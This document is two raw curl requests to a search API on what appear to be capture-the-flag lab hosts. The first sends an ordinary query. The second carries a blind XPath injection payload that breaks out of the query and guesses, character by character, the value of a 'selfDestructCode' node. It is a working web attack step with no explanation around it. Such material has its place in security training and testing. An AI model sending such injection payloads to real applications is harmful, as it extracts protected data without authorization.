curl 'http://139.59.190.72:32092/api/search' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Accept: */*' \
  -H 'Origin: http://139.59.190.72:32092' \
  -H 'Referer: http://139.59.190.72:32092/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw '{"search": "1"}' \
  --compressed \
  --insecure

curl 'http://138.68.182.20:31302/api/search' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Accept: */*' \
  -H 'Origin: http://138.68.182.20:31302' \
  -H 'Referer: http://138.68.182.20:31302/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw $'{"search":"\']|(/military/district/staff/selfDestructCode)[1][substring(text(), 1, 1) = \'C"}' \
  --compressed \
  --insecure